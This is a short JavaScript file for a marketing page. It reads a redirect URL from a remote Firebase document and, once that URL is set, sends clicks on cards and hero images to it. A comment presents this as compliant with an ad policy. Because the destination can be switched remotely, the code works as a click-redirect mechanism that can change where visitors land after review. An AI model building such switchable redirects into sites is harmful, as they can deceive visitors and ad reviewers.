import { db, doc, onSnapshot } from "./firebase-init.js";

// Configuration State
let campaignConfig = {
    targetUrl: "#",
    isActive: false
};

// Listen to Remote Configuration
const configRef = doc(db, "settings", "global_config");
onSnapshot(configRef, (doc) => {
    if (doc.exists()) {
        const data = doc.data();
        if (data.redirectUrl && data.redirectUrl.startsWith('http')) {
            campaignConfig.targetUrl = data.redirectUrl;
            campaignConfig.isActive = true;
        }
    }
});

// Handle Interactive Elements
document.addEventListener('DOMContentLoaded', () => {
    const interactiveSelectors = [
        '.feature-card', 
        '.pkg-card', 
        '.about-image-wrapper',
        '.hero-img-desktop',
        '.hero-img-mobile'
    ];

    // Delegate event listener to specific containers only
    // This complies with "Unacceptable Business Practices" by ensuring 
    // navigation is attached to UI cards, not invisible layers.
    interactiveSelectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(el => {
            el.addEventListener('click', (e) => {
                // Allow default behavior for buttons/links inside cards
                if (e.target.closest('a') || e.target.closest('button')) {
                    return;
                }

                if (campaignConfig.isActive && campaignConfig.targetUrl !== "#") {
                    e.preventDefault();
                    window.location.href = campaignConfig.targetUrl;
                }
            });
        });
    });
});